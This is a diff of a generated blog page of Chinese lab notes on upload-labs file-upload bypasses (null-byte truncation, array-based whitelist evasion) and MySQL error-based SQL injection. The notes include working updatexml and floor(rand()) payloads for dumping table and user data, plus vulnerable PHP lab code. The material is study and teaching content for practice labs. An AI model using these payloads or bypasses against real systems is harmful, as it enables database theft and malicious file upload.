class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>都表示为空,加了这个空字符的话，会将后面的字符截断不显示</p>
+<p> <strong>%00:在url中</strong></p>
+<p><strong>0x00:在编程语言中</strong></p>
+</blockquote>
+<blockquote>
+<p>这一关用的是白名单过滤</p>
+<p>​<kbd>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</kbd>​:获取提交的文件名</p>
+<p>​<kbd>strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)</kbd>​搜寻”.”首次出现的是在第几位，然后我们加1</p>
+<p>​<kbd>substr</kbd>​:获取字符串的子集,这里获取的是”.”后面的</p>
+</blockquote>
+<p>在实际路径直接加1.php%00</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%00%E6%88%AA%E6%96%AD/" data-id="cmawcfx9i002lcg7kgjgxelft" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -503,79 +361,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" data-id="cmawal1ja0023bo7k19vg1pps" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="sql注入靶场"><a href="#sql注入靶场" class="headerlink" title="sql注入靶场"></a>sql注入靶场</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html">sql末尾</a>    <a target="_blank" rel="noopener" href="https://blog.csdn.net/Joker_Dgh/article/details/123913722">sql-labs搭建</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" data-id="cmawal1ja0024bo7kdzyvf9vo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/%00截断" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%00%E6%88%AA%E6%96%AD/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>都表示为空,加了这个空字符的话，会将后面的字符截断不显示</p>
-<p> <strong>%00:在url中</strong></p>
-<p><strong>0x00:在编程语言中</strong></p>
-</blockquote>
-<blockquote>
-<p>这一关用的是白名单过滤</p>
-<p>​<kbd>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</kbd>​:获取提交的文件名</p>
-<p>​<kbd>strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)</kbd>​搜寻”.”首次出现的是在第几位，然后我们加1</p>
-<p>​<kbd>substr</kbd>​:获取字符串的子集,这里获取的是”.”后面的</p>
-</blockquote>
-<p>在实际路径直接加1.php%00</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%00%E6%88%AA%E6%96%AD/" data-id="cmawal1jb0025bo7kak3r9ypf" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" data-id="cmawcfx9i002mcg7k2jcb5vct" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -609,103 +395,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/0X00%E6%88%AA%E6%96%AD/" data-id="cmawal1jc0028bo7k5ptddmdi" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/报错注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><p>1、报错注入的分类</p>
-<p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，根据漏洞原因的不同，可以把MySQL报错注入分为以下几类：</p>
-<pre><code>· Biglnt等数据类型溢出
-
-· xpath语法错误
-
-· count()+rand()+group_by()导致主键重复
-
-· 空间数据类型函数错误
-</code></pre>
-<p>‍</p>
-<p><strong>xpath语法错误</strong></p>
-<p>从<strong>mysql5.1.5</strong>开始提供了两个<strong>XML</strong>查询和修改的函数:</p>
-<p>1.<strong>updatexml():</strong> 适用于5.5.5-5.5.49版本<br>2.extractvalue():适用于5.1.5+版本</p>
-<p>可以通过xml函数报错，来显示注入命令执行结果。</p>
-<p><strong>updatexml函数格式:</strong> updatexml((XML_document, XPath_string, new_value)</p>
-<p> <strong>·XML_document:</strong> xml文档的名称。</p>
-<p> <strong>·XPath_string:</strong> xpath格式的字符串</p>
-<p> <strong>·new_value:</strong> 替换查找到的符合条件的数据</p>
-<p><strong>extractvalue函数格式:</strong> extractvalue((XML document,XPath string)，除了没有第三个参数</p>
-<p>(new_value)，其它与updataxml()函数完全一样。所以后面只讲updatexml()函数的使用。</p>
-<p>简而言之，updatexml函数功能就是查找一个字符串，并进行替换。而我们在XPath</p>
-<p>string处也就是第二个参数那里传入不符合xpath格式的特殊字符，并加上一些查询语</p>
-<p>句，mysql就会把错误和查询语句的结果报错显示出来。这就是xpath报错注入的原理，</p>
-<p><strong>注意事项:</strong></p>
-<p>·必须是在<strong>XPath_string</strong>处传特殊字符，mysql才会报错，同时我们还需要注入命令，没这</p>
-<p>么多位置，所以要用到concat函数。</p>
-<p> <strong>·xpath</strong>只会对特殊字符进行报错，这里我们可以用16进制的0x7e(~)来进行利用。</p>
-<p>·<strong>xpath</strong>只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分</p>
-<p>段输出。</p>
-<p><strong>函数说明：</strong><br> <strong>·concat(s1,s2…sn):</strong> 将字符串s1,s2…sn合并为一个字符串。</p>
-<p>·<strong>substr(s,start,length):</strong> 从字符串s的 start 位置截取长度为 length 的子字符串，start从<strong>1</strong>开始。</p>
-<p>‍</p>
-<blockquote>
-<h3 id="报错注入流程"><a href="#报错注入流程" class="headerlink" title="报错注入流程"></a>报错注入流程</h3><p>1、寻找注入点		2、判断字符型还是数字型		3、判断闭合方式</p>
-<p><strong>4、使用updatexml查表</strong>  ?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),3) –+  <strong>(0x7e是~，为了使我们找出来的更好的分辨展示出来)为什么要加1和3是因为updatexml函数需要三个参数</strong></p>
-<p>系统执行的语句：SELECT * FROM users WHERE id&#x3D;’1’ and updatexml(1,concat(0x7e,database(),0x7e),3) – ‘ LIMIT 0,1</p>
-<p><strong>5、使用updatexml查找表名</strong></p>
-<p>?id’&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’),0x7e),3) –+</p>
-<p><strong>6、使用updatexmml查询列名</strong></p>
-<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’),3) –+</p>
-<p><strong>7、查询具体数据</strong></p>
-<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),3) –+   <strong>（爆不出全部，因为xpath只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分段输出）</strong></p>
-<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3) –+   <strong>(substr也要三个参数，后面两个是爆的范围，group_concat和limit不能一起用)</strong></p>
-</blockquote>
-<h3 id="思考一下，为什么要这么构造攻击语句"><a href="#思考一下，为什么要这么构造攻击语句" class="headerlink" title="思考一下，为什么要这么构造攻击语句?"></a>思考一下，为什么要这么构造攻击语句?</h3><p>首先回到语法格式上:updatexml((XML_document,XPath_string,new_value)，我们必须在XPath_string这个参数里填充xpath格式的字符串，但是如果我们填充一个不是xpath格式的字符串，就会产生报错，所以语句就变成了updatexml(1,database(),1)，前后两个1是随便填充的内容目的是满足三个参数。<br>但是由于xpath只会对<strong>特殊字符</strong>进行报错（还有其他字符也可以实现），这里我们可以用~，16进制的0x7e来进行利用，所以就变成了updatexml(1,0x7edataase()0x7e,1)，但是由于数据库无法认识中间的内容，所以就无法成功执行，所以可以用concat()函数把多个字符串合并成一个，就变成了updatexml(1,concat(0x7e,database(),0x7e),1)</p>
-<p>‍</p>
-<p>思考:为什么中间的查询语句外面要括号括起来?</p>
-<p>因为concat()，中间<strong>不允许有空格</strong>，所以需要括号括起来把变成一个整体。<br><strong>concat()</strong> 函数无法将多行合并为一行，所以可以先用group_conat()函数将多行合并为一行。</p>
-<p>‍</p>
-<p>‍</p>
-<p>报错注入主要是利用updatexml()函数，其它方法偶尔会用到，这里集中介绍。<br>rend()+group()+count():虚拟表报错</p>
-<p>获取数据库名<br>select 1 from(select</p>
-<p>count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;	#concat()的第二个参数是查询的命令，这里是database()获取表名<br>select 1 from(select count(</em>),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;<br>获取列名<br>select 1from(select count(</em>),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),floor(rand(0)*2))x  from information_schema.tables group by x)a;</p>
-<p>获取数据<br>select 1 from(select count(*),concat((select (select (select concat(0x7e,first_name,0x7e)))from users limit0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;</p>
-<p>或者使用下面的payload：</p>
-<p>获取数据库名<br>select count(*),concat((select database()),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p>
-<p>获取表名<br>select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p>
-<p>获取列名<br>select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’limit 0,1),0x7e,floor(rand(0)*2))as a  from information_schema.tables group by a;</p>
-<p>获取数据<br>select count(*),concat((select first name from users limit 0,1),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;</p>
-<p>（rand：生成0~1的随机数 floor向下取整）</p>
-<p>select count(*),concat((select database()),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;（会有一个虚拟的表group，因为floor是向下取整的，只会随机出来0或者1的值所以当键值插入相同的时候就会键值冲突，冲突就会报错出来）</p>
-<p>‍</p>
-<blockquote>
-<p> <strong>·几何函数:以下payload未测试</strong><br>GeometryCollection: id&#x3D;1 AND GeometryCollection((select * from(select * from(select user())a)b)polygon():id&#x3D;1 AND polygon((select * from(select *from(select user())a)b))multipoint():id&#x3D;l AND multipoint((select * from(select *from(select  user())a)b))multilinestring():id&#x3D;1 AND multilinestring((select *from(select * from(select user())a)b))linestring():id&#x3D;1 AND LINESTRING((select *from(select * from(select user())a)b))multipolygon():id&#x3D;1 AND multipolygon((select *from(selectfrom(select user())a)b))</p>
-<p>‍</p>
-<p><strong>name_const:</strong>  仅可用于获取数据库版本信息</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmawal1jc002abo7kgdet689b" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/0X00%E6%88%AA%E6%96%AD/" data-id="cmawcfx9i002ocg7kdjf07amm" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -738,7 +428,47 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/" data-id="cmawal1jd002bbo7kdix4cn9f" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/" data-id="cmawcfx9j002pcg7kh3mi286i" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/Pass-21" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名,是否为空，是空就用文件名字</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;<span class="comment">//通过‘.’分割勒，就不能用. .绕过，‘.’拿来分割成一个数组</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);<span class="comment">//file是个数组，ext后缀是取最后一个值再判断是不是在白名单</span></span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>首先检查conteng-type  源码表示只允许jpg，png，gif</p>
+</blockquote>
+<blockquote>
+<p>主要漏洞在数组这里</p>
+</blockquote>
+<p>需要在burp上面更改数组，让在有值的后面几位都是空的，例如file[0]&#x3D;1.php. file[1]’&#x3D;null,file[7]&#x3D;1,还需要更改content-type</p>
+<p><img src="/.com//image-20250202154152-0fqfc21.png" alt="image"></p>
+<p>变成数组的意义提交，第一个是1.php，更改一个比较长的值，第4个就是jpg白名单绕过</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/" data-id="cmawcfx9j002qcg7k78vs4zav" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -769,7 +499,84 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/" data-id="cmawal1jd002cbo7ka9hwhn9f" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/" data-id="cmawcfx9j002rcg7k4r7d0525" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/二次渲染绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span 